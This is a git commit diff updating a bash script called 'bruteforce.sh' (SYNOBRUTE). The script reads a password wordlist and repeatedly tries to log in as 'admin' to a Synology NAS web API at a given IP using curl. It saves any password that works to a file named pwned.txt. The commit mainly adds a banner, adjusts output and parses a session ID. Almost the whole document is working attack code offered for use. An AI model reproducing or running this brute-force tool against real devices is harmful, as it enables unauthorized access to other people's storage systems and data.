22460ad565ca28826c34c6950d02ebf829023190
Thomas Clauzel <t.clauzel@gmail.com>
2019-01-07 13:25:14 +0100

    Update bruteforce.sh

--- bruteforce.sh
+++ bruteforce.sh
@@ -1,20 +1,23 @@
 #!/bin/bash
+echo "
+██████╗ ██╗    ██╗███╗   ██╗██████╗  ██████╗ ██╗  ██╗
+██╔══██╗██║    ██║████╗  ██║██╔══██╗██╔═══██╗╚██╗██╔╝
+██████╔╝██║ █╗ ██║██╔██╗ ██║██████╔╝██║   ██║ ╚███╔╝
+██╔═══╝ ██║███╗██║██║╚██╗██║██╔══██╗██║   ██║ ██╔██╗
+██║     ╚███╔███╔╝██║ ╚████║██████╔╝╚██████╔╝██╔╝ ██╗
+╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝
+
+"
+echo "SYNOBRUTE - evolutio - 2018" 
 date
+echo ""
 echo " ./bruteforce.sh password.txt 192.168.1.101"
+echo ""
 cat password.txt |  while read output
 do
 [[ -z "$1" ]] && { echo "Parameter 1 is empty - fichier.txt " ; exit 1; }
 [[ -z "$2" ]] && { echo "Parameter 2 is empty - ip_adress_nas " ; exit 1; }
-#[[ -z "$3" ]] && { echo "Parameter 3 is empty - password " ; exit 1; }
-
-#echo "mot" $output
-#echo "fichir de dico nom fihier" $1
-#echo "target" $2
 echo "tentative avec le mot de passe $output sur $2"
-#sleep 60
-echo "-----------"
-echo "test for " $output
-echo "-----------"
 syno_user="admin"
 syno_pwd=$output
 syno_url=$2 # eg 192.168.1.100
@@ -27,18 +30,20 @@ authPath=$(echo "$curlResult" | jq -r '.["data"]["SYNO.API.Auth"]["path"]')
 curlResult=$(curl -s "http://${syno_url}:5000/webapi/${authPath}?api=SYNO.API.Auth&method=Login&version=${vAuth}&account=${syno_user}&passwd=${syno_pwd}&session=SurveillanceStation&format=sid")
 
 if [[ $(echo "$curlResult" | jq -r '.["success"]') == 'true' ]]; then
-                echo "succes login for $syno_url"
-                echo "---------------ecriture dans le log--------------------"
+                echo "-----------------------------------"                
+				echo "succes login for $syno_url"
+                echo "-----------------------------------"
+				echo ""
                 echo "login is admin $output" >> pwned.txt
                 exit 0
 fi
 if [[ $(echo "$curlResult" | jq -r '.["success"]') == 'false' ]]; then
         echo "Error on login : bad password !!!"
-        echo "$1 login not found"
+		echo ""
 else
         echo "Error on login"
-        echo "$1 login is down or unreachable"
+		echo ""
 fi
-                ##
+SID=$(echo "$curlResult" | jq -r '.["data"]["sid"]')				
 curl -s "http://${syno_url}:5000/webapi/${authPath}?api=SYNO.API.Auth&method=Logout&version=${vAuth}&_sid=${SID}" > /dev/null 2>&1
 done
